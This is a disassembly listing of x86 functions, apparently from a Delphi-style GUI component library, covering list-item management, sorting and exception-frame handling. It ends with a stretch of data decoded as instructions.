call [ edx + 0x24 ]
sub_43910c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_439187
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_4391a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41911c
mov [ esi + 0x18 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4391e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_404178
test eax eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4191c0
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_403f0c
pop esi
pop ebx
retn
sub_439240
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4393d8
push eax
mov edx esi
mov eax ebx
call sub_4393d8
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x28 ]
pop edi
pop esi
pop ebx
retn
sub_43927c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1d ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_419538
dec eax
jle r-xdata
push esi
mov eax ebx
call sub_419538
mov ecx eax
dec ecx
xor edx edx
mov eax ebx
call sub_439344
sub_4392ac
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
pop ebx
retn
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_407f38
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_407f00
jmp r-xdata
pop ebx
retn
sub_4392e8
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4393d8
mov ebp eax
mov edx edi
mov eax ebx
call sub_4393d8
mov [ esp ] eax
mov edx esi
mov eax ebx
call sub_4393d8
call sub_4191a8
mov esi eax
mov edx edi
mov eax ebx
call sub_4393d8
call sub_4191a8
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx esi
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_439344
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4392e8
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_439344
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_439410
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_419880
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x1d ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_439458
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455a18
mov [ esi + 0xc8 ] 0xffffffff
mov [ esi + 0x60 ] 0x0
mov dl 0x1
mov eax esi
call sub_455d30
mov dl 0x1
mov eax esi
call sub_439648
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4394b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x1
xor eax eax
push ebp
push sub_4395c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x0
retn
mov eax edi
mov edx [ r-xdata ]
call sub_4032d8
mov ecx eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_418700
cmp edi [ eax + 0x20 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_418700
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_418700
pop edx
mov ecx [ eax ]
call [ ecx + 0x8c ]
sub_4395d8
push ebx
push ecx
mov [ esp ] 0xffffffff
cmp [ eax + 0xba ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_439614
push ebx
mov ebx eax
mov eax ebx
call sub_421188
mov al [ ebx + 0xa1 ]
test al al
je r-xdata
mov eax [ ebx + 0xac ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_439648
pop ebx
retn
mov edx eax
mov eax ebx
call sub_439748
sub_439648
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xa0 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa0 ] dl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa1 ] dl
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
cmp eax 0xffffffff
je r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4397b4
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x1
xor eax eax
push ebp
push sub_439715
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_418700
mov dl [ ebp - 0x5 ]
mov ecx [ eax ]
call [ ecx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_418700
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_439748
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
test ebp ebp
je r-xdata
cmp ebp [ ebx + 0xa4 ]
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0xa4 ] ebp
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xac ] ebp
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418700
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418700
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_4397b4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xc8 ] ebp
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418700
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418700
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_439814
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0xd2 ] 0x0
setne bl
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0xd4 ]
call [ esi + 0xd0 ]
sub_439864
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439933
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
cmp esi eax
jge r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
jmp r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43993a
lea eax [ ebp - 0x18 ]
call sub_403eb8
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_439944
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
sub cl 0x1
jb r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
dec cl
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ rw-data ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4032d8
mov eax [ eax + 0x28c ]
call sub_43b09c
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ esp ]
mov edx [ eax + 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc esi
xor ebp ebp
inc ebp
dec esi
jne r-xdata
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_43a9f0
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_43a7b8
mov eax [ esp ]
mov ecx [ eax + 0x18 ]
xor edx edx
mov eax ebx
call sub_43a898
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_43a868
mov eax [ ebx + 0x20 ]
mov edx [ rw-data ]
call sub_4032b4
test al al
je r-xdata
mov eax [ esp ]
call sub_4191a8
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_418700
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov eax [ esp ]
call sub_4191a8
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_43ab24
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_418700
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_439ad8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_419814
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
mov eax [ eax + 0x50 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
inc ebp
mov [ esp ] 0x0
mov eax [ esi + 0x20 ]
mov edx [ rw-data ]
call sub_4032b4
test al al
je r-xdata
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_4032d8
mov esi eax
mov eax ebx
call sub_4191a8
mov edx eax
mov eax [ esi + 0x28c ]
call sub_4393d8
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebx + 0x18 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebx + 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc [ esp ]
dec ebp
jne r-xdata
mov eax ebx
call sub_4191a8
mov edx eax
mov eax [ esi + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_43aa7c
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
call sub_43a7b8
mov ecx [ ebx + 0x18 ]
xor edx edx
mov eax esi
call sub_43a898
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_43a868
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx [ esp ]
call sub_418700
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_439bf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_439458
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439410
mov esi eax
mov [ ebx + 0xd0 ] esi
mov [ esi + 0x28 ] ebx
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_439c54
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
lea eax [ esi + 0xd0 ]
call sub_40d31c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_455a6c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_439c90
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov esi edx
mov edi eax
test esi esi
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ edi + 0xd0 ]
call sub_419538
cmp esi eax
jl r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ edi + 0xd0 ]
call sub_4393d8
mov edx eax
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ edi + 0xda ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx edi
mov eax [ edi + 0xdc ]
call [ edi + 0xd8 ]
sub_439cfc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_4393d8
mov edx [ eax + 0x10 ]
mov eax edi
call sub_403f0c
pop edi
pop esi
pop ebx
retn
sub_439d30
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_4393d8
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop edi
pop esi
pop ebx
retn
sub_439d68
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_439d94
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_421610
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ esi + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_439e48
sub_439dd8
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
pop esi
pop ebx
retn
mov eax esi
call sub_439e48
mov eax [ esi + 0x10 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
sub_439e48
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_439f8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439f92
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov ebx [ esi + 0x10 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_4393d8
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x90 ]
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x94 ]
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_4393d8
mov ecx eax
mov edx ebx
mov eax edi
call sub_439c90
test al al
je r-xdata
jmp r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_439814
test al al
je r-xdata
sub_439fa0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_439fbf
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439fc6
retn
sub_439fcc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_43a004
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a029
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a030
retn
sub_43a03c
mov [ eax + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
mov al [ 0x40043 ]
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc esi
outsd
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
cmp al 0xa7
inc ebx
add [ eax - 0x59 ] dl
inc ebx
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
inc ebx
add [ eax + 0x48004192 ] ah
mov al 0x43
add al bh
popad
je r-xdata
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
jb r-xdata
outsb
outsb
je r-xdata
je r-xdata
add [ eax ] al
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
mov eax [ 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
mov eax [ 0x280043 ]
add [ eax ] al
clc
add [ ebx ] 0x70
xor eax [ eax ]
jl r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
adc [ ecx + 0x43 ] ah
add al bh
lea eax [ ecx ]
add [ esi - 0x50bbffbf ] cl
inc ebx
add al ah
push esp
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al [ eax ]
push es
dec ecx
arpl [ ebp ] ax
and [ eax ] al
add bh bh
sub al 0x0
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ecx ] dl
dec edi
jbe r-xdata
insd
lea eax [ eax ]
pop eax
mov eax [ 0xc070043 ]
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
scasd [ edi ]
inc ebx
add [ ecx + edx * 4 - 0x506fffbd ] ah
inc ebx
add ah al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
xchg ecx eax
inc ecx
jb r-xdata
jl r-xdata
popad
jns r-xdata
add al dl
test [ ebx ] eax
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
adc [ edi + 0x76 ] ecx
jb r-xdata
je r-xdata
scasd [ edi ]
inc ebx
add [ eax ] bl
mov al 0x43
add [ eax + esi * 4 + 0x43 ] ah
add [ eax + 0xc0043b0 ] al
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + edx * 4 + 0x41 ] dl
xchg ecx eax
imul ebp [ edi + 0x6e ] 0x6d726f46
cwde
inc ecx
add [ eax + ebx * 4 ] dl
inc ecx
add [ eax - 0x6c ] dl
inc ecx
add ah cl
inc eax
mov [ edx + 0x43 ] ah
insd
popad
dec ecx
outsb
js r-xdata
mov cl 0x43
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
inc ebp
add [ eax + eax ] bl
insd
adc [ ecx - 0x7b6bffbd ] ah
inc ebx
add [ 0x6f430800 ] al
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x180043a3 ] al
add [ eax ] al
je r-xdata
xchg esp eax
inc ecx
add [ edx + edx * 4 - 0x4e2fffbd ] ch
inc ebx
add [ 0x6d6f4354 ] cl
bound ebp [ edi + 0x45 ]
js r-xdata
add [ eax ] dl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebx + edx * 4 + 0x41 ] cl
add al bh
lea eax [ ecx ]
add [ esi - 0x6c47ffbf ] cl
inc ecx
add [ eax + ebx * 4 + 0x41 ] dl
add [ eax - 0x68 ] bl
inc ecx
add [ ecx + esi * 4 + 0x43 ] bl
inc ebx
add bh bh
xor [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al 0x0
